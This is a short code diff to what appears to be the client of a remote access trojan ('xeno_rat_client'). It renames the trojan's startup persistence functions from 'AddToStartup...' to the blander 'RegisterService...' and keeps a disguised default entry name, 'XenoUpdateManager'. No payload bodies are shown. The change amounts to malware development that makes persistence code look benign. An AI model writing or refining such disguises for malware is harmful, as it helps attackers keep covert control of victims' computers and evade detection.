@@ -278,7 +278,7 @@ namespace xeno_rat_client
             Process.GetCurrentProcess().Kill();
         }
 
-        public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
+        public async static Task<bool> RegisterServiceNonAdmin(string executablePath, string name= "XenoUpdateManager")
         {
             return await Task.Run(() =>
                    {
@@ -297,7 +297,7 @@ namespace xeno_rat_client
                         }
                    });
         }
-        public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "XenoUpdateManager")
+        public static async Task<bool> RegisterServiceAdmin(string executablePath, string name = "XenoUpdateManager")
         {
             try
             {
